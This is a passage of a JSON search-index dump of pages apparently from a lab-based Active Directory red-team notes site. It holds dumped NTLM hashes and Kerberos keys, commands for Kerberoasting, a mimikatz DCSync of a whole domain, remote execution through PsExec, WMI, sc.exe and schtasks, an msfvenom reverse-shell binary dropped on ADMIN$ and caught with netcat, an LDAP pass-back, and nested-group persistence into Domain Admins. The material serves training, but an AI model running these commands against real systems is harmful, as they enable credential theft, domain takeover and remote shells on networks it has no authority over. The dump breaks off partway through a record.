SYSTEM $ sudo python3 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local [sudo] password for nina: Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:c232a51e1cdcaaed24259e15687cbfc7a0130457855c918ebfccd5c54ab70c8f5b916aed1554619c1b617918098cb2dd3e3b981c61ccdba2af687d5d4d3a0aa6ae652f6d6c05cc30f21c75bd268107a5d07f60a0ef156073d5dc0282fe87d819d2ad387ab71ffc53fc56a34350ac3c2f990ca9aacacc615ab78576a52033dd468d1b6cf29f9ca18fb3c97b523e0289a0df7806b2a4d303714483d548fbb0866068cd17bad7c21ab5a00e863d17c8f6ddf88f6a3d72b425b231d6963968e7fbeba968e119f4c296cf600c2f53f31f2b383bf53cf1b9cbe0afccb04b36ce1759c91ffebf1649d9aea4c66c4b59f0f2a3f1 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624 [*] DPAPI_SYSTEM dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32 [*] NL$KM 0000 8D D2 8E 67 54 58 89 B1 C9 53 B9 5B 46 A2 B3 66 ...gTX...S.[F..f 0010 D4 3B 95 80 92 7D 67 78 B7 1D F9 2D A5 55 B7 A3 .;...}gx...-.U.. 0020 61 AA 4D 86 95 85 43 86 E3 12 9E C4 91 CF 9A 5B a.M...C........[ 0030 D8 BB 0D AE FA D3 41 E0 D8 66 3D 19 75 A2 D1 B2 ......A..f=.u... NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: thm.red\\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889::: thm.red\\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207::: thm.red\\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666::: [*] Kerberos keys from ntds.dit Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30 Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0 Administrator:des-cbc-md5:6d34e608f8574632 CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:508aa735622e15c3fdd0a12f52ce779fa382205b828bdc0f441ddfeaef1bbf13 CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:db9e72cb40e0f8b93a7f44e7f79669fc CREDS-HARVESTIN$:des-cbc-md5:f434a7298562ec6e krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3 krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c krbtgt:des-cbc-md5:d92ffd4abf02b049 thm.red\\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca thm.red\\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c thm.red\\thm:des-cbc-md5:794f3889e646e383 thm.red\\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac thm.red\\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529 thm.red\\victim:des-cbc-md5:457cdc673d3b0d85 thm.red\\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26 thm.red\\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf thm.red\\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4 thm.red\\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f thm.red\\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6 thm.red\\admin:des-cbc-md5:32a8a201d3080b2f thm.red\\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d thm.red\\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d thm.red\\svc-thm:des-cbc-md5:f8e57c49f7dc671c thm.red\\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e thm.red\\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546 thm.red\\bk-admin:des-cbc-md5:108cc2b0d3100767 thm.red\\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660 thm.red\\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64 thm.red\\test-user:des-cbc-md5:aec8e3325b85316b...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4ad518bee3836c5472065f3322e34fbe",
    "u": "https://ad.tymyrddin.dev/docs/harvest/hashes",
    "t": "Hashes and tickets ",
    "c": "Hashes and tickets  $ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 10:47:33.796826 <never> $ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm -request-user svc-thm Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 10:47:33.796826 <never> [-] CCache file is not found. Skipping... [ticket] Hashcat: $ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2d64a1400df48fe8467f0e0707547013",
    "u": "https://ad.tymyrddin.dev/docs/pivot/moving",
    "t": "Moving through the network ",
    "c": "Moving through the network  Local administrator accounts may be repeated across multiple hosts on the network. Even if that is the case a local administrator cannot access a computer remotely with admin privileges using WinRM, SMB, or RPC. The local administrator must use RDP to open an administrative session on a host. This setting can be changed. The built-in default administrator account is not subject to UAC, while other local administrator accounts are. Domain accounts with local admin can open an administrative login using RDP, WinRM, SMB, or RPC. This can be disabled.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a946e73ccb1e84a130587556b2c0385f",
    "u": "https://ad.tymyrddin.dev/docs/persist/creds",
    "t": "Persistence through credentials ",
    "c": "Persistence through credentials  It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. These organisations make use of multiple DCs. Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. This includes updated information such as the user’s new password and new objects such as when a new user is created. The process of replication is called DC Synchronisation. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. A popular attack to perform is a DC Sync attack. With access to an account that has domain replication permissions, it is possible to stage a DC Sync attack to harvest credentials from a DC. Passwords  Passwords can easily be changed and will be changed by the blue team when an attacker is discovered. More reliable credentials would be: Local Administrative Accounts (Could still maintain a presence on multiple machines) Delegate Accounts (Given the right delegation, could generate silver or golden tickets) AD Service Credentials (WSUS, SCCM, Could force changes on the network) Order of Operations  Use your unprivileged credentials from the distributor to facilitate initial access Use the given Administrator credentials to perform privileged operations. Pretend that these are credentials you’ve obtained during the exploitation phase . DC Sync  SSH to THMWRK1 : ssh administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc To do a DC Sync of a single account DC Sync with Mimikatz, test it on the user credential obtained from the distributor: powershell.exe -ep bypass C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # lsadump::dcsync /domain:za.tryhackmloc /user:user.name To dcsync all users from the domain controller: Specify a log file in the Mimikatz session Or, exit Mimikatz and run a one-liner Log file  To enable logging on Mimikatz (change user.name to the one received from the distributor): mimikatz # log <user.name>_dcdump.txt Using '<user.name>_dcdump.txt' for logfile: OK Use the /all flag: mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all Takes a while … Once done, exit Mimikatz to finalise the dump find. Download the <user.name>_dcdump.txt or dcsyncall.txt file: scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/<user.name>_dcdump.txt . Recover all the usernames: cat <user.name>_dcdump.txt | grep \"SAM Username\" Recover all hashes: cat <user.name>_dcdump.txt | grep \"Hash NTLM\" One-liner  The better solution because it keeps the log files clean: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe 'lsadump::dcsync /domain:za.tryhackme.loc /all' > dcsyncall.txt Download the dcsyncall.txt file: scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/dcsyncall.txt . Remove Windows CRLF line endings and change to utf8 encoding dos2unix dcsyncall.txt Inspect the file with the less command, using the arrow keys to navigate, and searching for a term by hitting the / key: less dcsyncall.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2f05a9495afdd1e7eb59e97693ede679",
    "u": "https://ad.tymyrddin.dev/docs/pivot/spawning",
    "t": "Spawning processes remotely ",
    "c": "Spawning processes remotely  Remote Session Port(s) Requirements PsExec TCP/445 Account must be an administrator WinRM over HTTP TCP/5985 Group Memberships: Remote Management Users WinRM over HTTPS TCP/5986 Group Memberships: Remote Management Users DCE/RPC TCP/135, TCP/49152-65535 Group Memberships: Administrators RPC over SMB Named Pipes TCP/445 Group Memberships: Administrators RPC over SMB Named Pipes TCP/139 Group Memberships: Administrators PsExec  Authentication workflow Connect to Admin$ share and upload a service binary psexesvc.exe . Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\\Windows\\psexesvc.exe . Create some named pipes to handle stdin / stdout / stderr . Start a remote command prompt: .\\psexec.exe \\\\<IP target> -u <username> -p <password> -i cmd.exe WinRM  PowerShell: $username = 'user.name' $password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) $session = New-PSSession -ComputerName target-ip -Credential $credential $session | Enter-PSSession Cleanup: $session | Remove-PSSession A single command: $username = 'user.name' $password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) Invoke-Command -ComputerName target-ip -Credential -ScriptBlock {Get-ComputerInfo} sc.exe  Remote command execution by registering and running services on a host. The service is configured to run a command at start up. Try authenticating to the Service Control Manager using RPC first. If RPC fails: Try communicating using an SMB named pipe Register the fake service ( binpath is the command to run on the host) sc.exe \\\\<IP Target> create <fakeservice> binpath= \"net user <username> <password> /add\" start= auto Start the remote service to run the command: sc.exe \\\\<IP Target> start <fakeservice> Stop and cleanup: sc.exe \\\\<IP Target> stop <fakeservice> sc.exe \\\\<IP Target> delete <fakeservice> schtasks  Remote command/payload execution by registering a scheduled task on a host. Create and run Task: schtasks /s target-ip /RU \"SYSTEM\" /create /tn \"Task\" /tr \"powershell -command 'Get-ComputerInfo'\" /sc ONCE /sd 01/01/1970 /st 00:00 schtasks /s target-ip /run /tn \"Task\" Cleanup: schtasks /s target-ip /tn \"Task\" /DELETE /F Flag  Leverage a session on the jump host to deliver a payload to an IIS web server. The payload will connect back to the attack machine (Kali VM in my case). Use the credentials downloaded (see setup ) to ssh into thmjmp2 : ssh <username>@za.tryhackme.com@thmjmp2.za.tryhackme.com On attack machine, create a service binary payload: msfvenom -p windows/shell_reverse_tcp LHOST=<IP address VPN> LPORT=4444 -f exe-service -o iispwn.exe Use the given credentials to transfer the file to the IIS server: smbclient -c 'put iispwn.exe' -U <username> -W ZA '//thmiis.za.tryhackme.com/ADMIN$' <password> Start a listener to receive the reverse shell from the IIS server: sudo nc -lnvp 4444 Use the ssh session on thmjmp2 as reverse shell (no need for runas etc.): sc.exe \\\\thmiis.za.tryhackme.com create pwniis binpath= \"%windir%\\isspwn.exe\" start= auto sc.exe \\\\thmiis.za.tryhackme.com start pwniis Run the flag.exe file on the users desktop on THMIIS.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "093b6015291fb1fbadbc31ad08ab943f",
    "u": "https://ad.tymyrddin.dev/docs/enum/powershell",
    "t": "Through PowerShell ",
    "c": "Through PowerShell  All domain users: Get-ADUser -Filter * Find any user where name ends in ... phillips : Get-ADUser -Filter 'Name -like \"*phillips\"' Find user beth.nolan and return all properties: Get-ADUser -Identity john.doe -Properties * – All domain groups: Get-ADGroup -Filter * Pipe the Administrators group object to Get-ADGroupMember to retrieve members of the group: Get-ADGroup -Identity Administrators | Get-ADGroupMember Get any domain objects that we modified on or after a specific date and time: $modifiedDate = Get-Date '2022/10/11' Get-ADObject -Filter 'whenChanged -ge $modifiedDate' -IncludeDeletedObjects Get information about the domain from the domain controller: Get-ADDomain Change a User Password: $oldPass = Read-Host -AsSecureString -Prompt 'Enter the old password' $newPass = Read-Host -AsSecureString -Prompt 'Enter the new password' Set-ADAccountPassword -Identity user.name -OldPassword $oldpPass -NewPassword $newPass",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "85c492c2b49421e15a2ce1096456873d",
    "u": "https://ad.tymyrddin.dev/docs/breach/ldap",
    "t": "LDAP bind credentials ",
    "c": "LDAP bind credentials  Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. And with LDAP authentication, the application directly verifies the user’s credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user’s credentials. LDAP authentication is a much used mechanism with third-party (non-Microsoft) applications that integrate with AD. Examples of applications and systems: Gitlab Jenkins Custom-developed web applications Printers VPNs If any of these applications or services are exposed on the internet, the same type of attacks as leveraged against NTLM authenticated systems can be used. And because a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. We can attempt to recover the AD credentials used by the service to gain authenticated access to AD. LDAP pass-back  A common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom. LDAP Pass-back attacks can be performed when we gain access to a device’s configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Often, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password . Test settings In this case, we can not directly extract the LDAP credentials because the password is hidden: We did find a username though. But we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials. Rogue LDAP server  install OpenLDAP: sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd Reconfigure the LDAP server to use za.tryhackme.com for the DNS domain name and Organisation: sudo dpkg-reconfigure -p low slapd Make it vulnerable by downgrading the supported authentication mechanisms. Create a file olcSaslSecProps.ldif : # olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred olcSaslSecProps : Specifies the SASL security properties noanonymous : Disables mechanisms that support anonymous login minssf : Specifies the minimum acceptable security strength with 0, meaning no protection. Use the ldif file to patch the LDAP: $ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"cn=config\" Check: ldapsearch -H ldap:// -x -LLL -s base -b \"\" supportedSASLMechanisms dn: supportedSASLMechanisms: PLAIN supportedSASLMechanisms: LOGIN Capturing LDAP credentials  Click the “Test Settings” at http://printer.za.tryhackme.com/settings.aspx again, the authentication will occur in clear text. If you the rogue LDAP server is configured correctly, and is downgrading the communication, you will receive the following error: “This distinguished name contains invalid syntax”. If you receive this error, you can use a tcpdump to capture the credentials: sudo tcpdump -SX -i breachad tcp port 389 Or fire up Wireshark or tshark and find the cleartext bind request password. Stop the LDAP server. sudo systemctl disable --now slapd",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "47853655c971f82151d07233057c1ff2",
    "u": "https://ad.tymyrddin.dev/docs/persist/group",
    "t": "Persistence through group membership ",
    "c": "Persistence through group membership  Warning  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. The most privileged groups or resources are not always the best choice, as they are often more closely watched for changes by the blue team. Exploiting permission delegation gave privileges to reset user passwords, which would be good for maintaining access to workstations. A local administrator group may be less monitored than a global administrator groups, and a group nested in a privileged group may be the access needed. SSH to THMDC : ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Create groups  Launch PowerShell powershell -ep bypass Create group in the People\\IT OU: New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 1\" -SamAccountName \"THM_nestgroup1\" -DisplayName \"THM Nest Group 1\" -GroupScope Global -GroupCategory Security Create group in the People\\Sales OU: New-ADGroup -Path \"OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 2\" -SamAccountName \"THM_nestgroup2\" -DisplayName \"THM Nest Group 2\" -GroupScope Global -GroupCategory Security Create group in the People\\Consulting OU: New-ADGroup -Path \"OU=CONSULTING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 3\" -SamAccountName \"THM_nestgroup3\" -DisplayName \"THM Nest Group 3\" -GroupScope Global -GroupCategory Security Create group in the People\\Marketing OU: New-ADGroup -Path \"OU=MARKETING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 4\" -SamAccountName \"THM_nestgroup4\" -DisplayName \"THM Nest Group 4\" -GroupScope Global -GroupCategory Security Create group in the People\\IT OU: New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 5\" -SamAccountName \"THM_nestgroup5\" -DisplayName \"THM Nest Group 5\" -GroupScope Global -GroupCategory Security Nesting  Add Group 1 to Group 2 Add-ADGroupMember -Identity 'THM_nestgroup2' -Members 'THM_nestgroup1' Add Group 2 to Group 3 Add-ADGroupMember -Identity 'THM_nestgroup3' -Members 'THM_nestgroup2' Add Group 3 to Group 4 Add-ADGroupMember -Identity 'THM_nestgroup4' -Members 'THM_nestgroup3' Add Group 4 to Group 5 Add-ADGroupMember -Identity 'THM_nestgroup5' -Members 'THM_nestgroup4' Add Group 5 to Domain Admins Add-ADGroupMember -Identity 'Domain Admins' -Members 'THM_nestgroup5' Add unprivileged user to Group 1 Add-ADGroupMember -Identity 'THM_nestgroup1' -Members 'user.name' Verify inherited privileges  SSH to thmwrk1 as the unprivileged user. ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Try accessing a privileged resource on the domain controller: dir \\\\thmdc.za.tryhackme.loc\\c$\\Users Volume in drive \\\\thmdc.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\thmdc.za.tryhackme.loc\\c$ 01/04/2022 08:47 AM 103 delete-vagrant-user.ps1 05/01/2022 09:11 AM 169 dns_entries.csv 09/15/2018 08:19 AM <DIR> PerfLogs 05/11/2022 10:32 AM <DIR> Program Files 03/21/2020 09:28 PM <DIR> Program Files (x86) 05/01/2022 09:17 AM 1,725 thm-network-setup-dc.ps1 04/25/2022 07:13 PM <DIR> tmp 05/15/2022 09:16 PM <DIR> Tools 04/27/2022 08:22 AM <DIR> Users 04/25/2022 07:11 PM <SYMLINKD> vagrant [\\\\vboxsvr\\vagrant] 04/27/2022 08:12 PM <DIR> Windows 3 File(s) 1,997 bytes 8 Dir(s) 51,573,755,904 bytes free If this was a real organisation, we would not be creating new groups to nest. Instead, we would make use of the existing groups to perform nesting. This is something you would never do on a normal red team assessment and almost always dechain at this point since it breaks the organisation’s AD structure, and if we sufficiently break it, they would not be able to recover. At this point, even if the blue team was able to kick us out, the organisation would more than likely still have to rebuild their entire AD structure from scratch, resulting in significant damages.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1e760019aecfc1b87935c3bb0ff1458b",
    "u": "https://ad.tymyrddin.dev/docs/breach/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Breaching Active Directory What?  Acquire an initial set of valid Active Directory (AD) credentials for a way to authenticate to AD, allowing further enumeration on AD. Why?  To be able to exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution. How?  The attack surface for gaining an initial set of credentials is usually significant. This is by no means an exhaustive list: NTLM authenticated services LDAP bind credentials Authentication relays Microsoft Deployment Toolkit Configuration files",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1a5f0ea7ad79b4626bac31aad34030de",
    "u": "https://ad.tymyrddin.dev/docs/harvest/access",
    "t": "Credential access ",
    "c": "Credential access  Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs. Credentials are stored insecurely in various locations in systems: Unsecured Credentials: Credentials In Files - search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. Database files Memory Password managers Enterprise Vaults Active Directory Network Sniffing PowerShell history  As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt . It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, to look for the password keyword in the Window registry: c:\\Users\\user> reg query HKLM /f password /t REG_SZ /s OR C:\\Users\\user> reg query HKCU /f password /t REG_SZ /s Database Files  Applications use database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. Configuration files contains a showcase example of extracting credentials from the local McAfee Endpoint database file. Password Managers  A password manager is an application to store and manage users’ login information for local and Internet websites and services. Since it deals with users’ data, it must be stored securely to prevent unauthorized access. Password Manager applications can be built-in (Windows) or third-party, like KeePass, 1Password, LastPass Misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools can be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications. Memory Dump  The Operating system’s memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system. The following are examples of memory stored sensitive data, including clear-text credentials, cached passwords, and AD Tickets. Active Directory  Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room. The following are some Active Directory misconfigurations that may leak users’ credentials: Users’ description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorised access. Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. NTDS: Contains AD users’ credentials, making it a target for attackers. AD Attacks: Misconfiguration makes AD vulnerable to various attacks. Network Sniffing  Gaining initial access to a target network enables attackers to attack local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes. Resources  MITRE ATT&CK framework TA0006",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b0bc35781c68ca350136f4c79d2fb8cc",
    "u": "https://ad.tymyrddin.dev/docs/pivot/lateral",
    "t": "Moving laterally using wmi ",
    "c": "Moving laterally using wmi  Connecting to wmi from powershell  Create a credential object for authentication $username = 'user.name' $password = 'password' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) Create a CIM session for repeated use: DCOM : Connect to the target via RPC on TCP/135 , RPC will direct the client to high numbered port TCP/49152-65535 WSman : WinRM – connect via HTTP (TCP/5985) or HTTPS (TCP/5986) $server = 'target-ip / fqdn' $sessionopt = New-CimSessionOption -Protocol DCOM $session = New-CimSession -ComputerName $server -Credential $credential -SessionOption $sessionopt -ErrorAction Stop Remote process creation  We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before: $Command = \"powershell.exe -Command Set-Content -Path C:\\text.txt -Value whatever\"; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command } WMI will create the required process silently (it does not show the output of any command). On legacy systems, the same can be done using wmic from the command prompt: wmic.exe /user:<username> /password:<password> /node:TARGET process call create \"cmd.exe /c calc.exe\" Run a command remotely  Run a command in the CIM session to test if the target can connect back to the attack machine as a pre-check to a reverse shell. Used is Parameter splatting . With many thanks to 0xBEN . $kaliVpnIP = 'kali-vpn-ip' $kaliPort = 443 # Try to connect back to Kali on a TCP port of choice $command = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `\"[Net.Sockets.TcpClient]::new().ConnectAsync('$kaliVpnIP', $kaliPort)`\"\" # Parameter splatting $parameters = @{ CimSession = $session ClassName = 'Win32_Process' MethodName = 'Create' Arguments = @{ CommandLine = $command } } Invoke-CimSession @parameters Creating services remotely  Register a service called fakeservice on the target. This only creates the service and does not execute the command specified in PathName : $parameters = @{ CimSession = $session ClassName = 'Win32_Service' MethodName = 'Create' Arguments = @{ Name = 'fakeservice' DisplayName = 'fakeservice' PathName = 'net user <username> <password> /ADD' ServiceType = [byte]16 StartMode = 'Manual' } } Invoke-CimMethod @parameters Get the service and run it on the target. This will cause the service to run and create the local user username with a password of password . $svc = Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter \"Name LIKE 'fakeservice'\" $svc | Invoke-CimMethod -MethodName StartService Change the command and add the username user to the local Administrators group. $svc | Invoke-CimMethod -MethodName Change -Arguments @{PathName = 'net localgroup Administrators <username> /ADD'} $svc | Invoke-CimMethod -MethodName StartService Cleanup: $svc | Invoke-Cimmethod -MethodName StopService $svc | Invoke-CimMethod -MethodName Delete Scheduled tasks  The action is to run: cmd.exe /c net user add <username> <password> /ADD` . Payload must be split in command and arguments : $command = 'cmd.exe' $arguments = '/c net user <username> <password> /ADD' $parameters = @{ CimSession = $session Execute = $command Argument = $arguments } $action = New-ScheduledTaskAction @parameters Create the task on the remote host and assign it the action stored in the $action variable, then start the task: $parameters = @{ CimSession = $session Action = $action User = 'NT AUTHORITY\\SYSTEM' TaskName = 'taskname' } $task = Register-ScheduledTask @parameters $task | Start-ScheduledTask Add the username user to the local administrators group: $arguments = '/c net user <username> <password> /ADD' $parameters = @{ CimSession = $session Execute = $command Argument = $arguments } $action = New-ScheduledTaskAction @parameters $task = Set-ScheduledTask -CimSession $session -TaskName taskname -Action $action $task | Start-ScheduledTask $task | Unregister-ScheduledTask",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "60972a1214ecd786b5ffce8553dec1d3",
    "u": "https://ad.tymyrddin.dev/docs/pivot/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Lateral Movement and Pivoting What?  Move around the network while creating as few alerts as possible. From one system taking over another. Why?  To have alternatives to find the best path to take. For example, if another system is untouchable or more secure or if the first was not compromised. How?  Setup for THM AD Moving through the network Spawning processes remotely Moving laterally using wmi Use of alternate authentication material Abusing user behaviour Port forwarding Cleanup",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9670818b63e9310bd8c88f2a8b062e30",
    "u": "https://ad.tymyrddin.dev/docs/exploit/certificates",
    "t": "Exploiting certificates ",
